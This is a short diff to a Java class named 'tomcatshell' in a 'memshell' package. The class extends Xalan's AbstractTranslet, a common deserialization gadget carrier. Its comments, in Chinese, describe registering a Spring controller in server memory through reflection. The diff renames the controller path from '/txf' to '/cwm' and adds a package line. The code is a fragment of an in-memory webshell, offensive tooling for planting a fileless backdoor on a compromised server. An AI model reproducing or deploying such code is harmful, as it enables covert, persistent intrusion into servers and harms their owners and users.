@@ -1,3 +1,5 @@
+package com.sec.cwm.base.memshell;
+
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -35,7 +37,7 @@ public class tomcatshell extends AbstractTranslet{
         // 通过反射获得该类的test方法
         Method method2 = tomcatshell.class.getMethod("test");
         // 定义该controller的path
-        PatternsRequestCondition url = new PatternsRequestCondition("/txf");
+        PatternsRequestCondition url = new PatternsRequestCondition("/cwm");
         // 定义允许访问的HTTP方法
         RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
         // 在内存中动态注册 controller
